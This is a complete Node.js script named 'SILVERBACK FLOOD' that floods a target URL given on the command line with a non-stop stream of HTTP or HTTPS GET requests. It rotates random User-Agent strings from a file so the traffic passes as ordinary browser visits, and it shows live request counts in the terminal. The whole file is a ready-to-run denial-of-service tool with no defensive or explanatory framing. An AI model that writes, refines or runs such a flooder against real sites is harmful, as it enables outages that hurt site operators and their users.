const https = require('https'); // Use HTTPS module for secure connections
const http = require('http'); // HTTP module in case it's an HTTP connection
const fs = require('fs');

// Load User-Agent from a file (ua.txt)
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Stats
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;

// Random User-Agent picker
function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Basic headers to make the request look like it's from a real browser
function getHeaders() {
  return {
    'User-Agent': getRandomUserAgent(),
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
  };
}

// Send the request (supports both HTTP and HTTPS)
function sendRequest(target) {
  const protocol = target.startsWith('https://') ? https : http; // Choose the right protocol
  const options = {
    hostname: target.replace(/^https?:\/\//, ''), // Strip out any 'http://' or 'https://' from the URL
    port: protocol === https ? 443 : 80, // Choose the correct port based on protocol
    path: '/',
    method: 'GET',
    headers: getHeaders(),
  };

  const req = protocol.request(options, (res) => {
    if (res.statusCode >= 200 && res.statusCode < 400) {
      successfulRequests++;
    } else {
      failedRequests++;
    }

    totalRequests++;
  });

  req.on('error', (error) => {
    failedRequests++;
    totalRequests++;
    console.error(`[Error] Request failed: ${error.message}`);
  });

  req.end();
}

// Log stats every second
function logStats() {
  setInterval(() => {
    console.clear(); // Clear the terminal
    console.log('SILVERBACK FLOOD');
    console.log('======================');
    console.log(`TOTAL REQUESTS: ${totalRequests}`);
    console.log(`SUCCESSFUL: ${successfulRequests}`);
    console.log(`FAILED: ${failedRequests}`);
  }, 1000);
}

// Start flooding
function startFlood(target) {
  if (!target) {
    console.log('Usage: node flooder.js <target_url>');
    process.exit(1);
  }

  logStats(); // Start logging the stats

  // Continuously send requests
  setInterval(() => {
    sendRequest(target);
  }, 0); // No interval, just flood non-stop
}

// Get target from command-line argument and start
const target = process.argv[2];
startFlood(target); // Start flooding the target
